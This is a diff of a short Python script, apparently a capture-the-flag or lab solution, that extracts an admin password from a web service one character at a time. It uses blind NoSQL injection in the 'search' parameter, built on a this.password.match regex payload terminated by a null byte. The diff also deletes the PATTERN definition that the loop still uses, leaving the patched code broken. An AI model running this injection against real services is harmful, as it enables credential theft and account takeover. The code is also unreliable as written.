@@ -5,8 +5,6 @@ import requests as req
 import re
 
 URL = "http://REDACTED/"
-PARAMS = "?search=admin'%20%26%26%20this.password.match($payload)%00"
-PATTERN = "search=admin"
 FORMAT = "XXXXXXXX-XXXX-XXXX-XXXX-XXXXXXXXXXXX"
 alpha = "abcdef0123456789"
 password = ""
@@ -18,8 +16,8 @@ for c in FORMAT:
         else:
                 for i in alpha:
                         payload = "/^"+password+i+".*$/"
-                        PARAMS = "?search=admin'%20%26%26%20this.password.match("+payload+")%00"
-                        r = req.get(URL+PARAMS)
+                        params = "?search=admin'%20%26%26%20this.password.match("+payload+")%00"
+                        r = req.get(URL+params)
                         if (re.search(PATTERN,r.text)):
                                 password = password + i
                                 break
